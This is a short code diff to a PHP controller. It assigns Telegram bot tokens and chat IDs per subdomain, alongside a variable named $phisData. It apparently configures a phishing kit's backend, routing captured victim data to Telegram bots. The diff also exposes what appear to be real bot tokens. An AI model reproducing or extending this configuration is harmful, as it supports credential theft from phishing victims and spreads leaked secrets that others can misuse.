@@ -93,12 +93,12 @@ class HomeController extends Controller
             $phisData = "MY6";
         } else   if ($subdomain == "live-vc-private1-my7") {
             // BOT 7
-            $bot_token = "7715200794:AAEE-I3Q5jU5vl7SYD7VR356m-NEqxre7GI";
-            $chat_id = "7659680018";
+            $bot_token = "7628917568:AAEG9egRkGovhj0tVNaw_fw-HEKMwxk70T0";
+            $chat_id = "7628917568";
             $phisData = "MY7";
         } else  if ($subdomain == "live-vc-private1-my8") {
             // BOT 8
-            $bot_token = "7628917568:AAEG9egRkGovhj0tVNaw_fw-HEKMwxk70T0";
+            $bot_token = "";
             $chat_id = "7628917568";
             $phisData = "MY8";
         } else  if ($subdomain == "live-vc-private1-my9") {
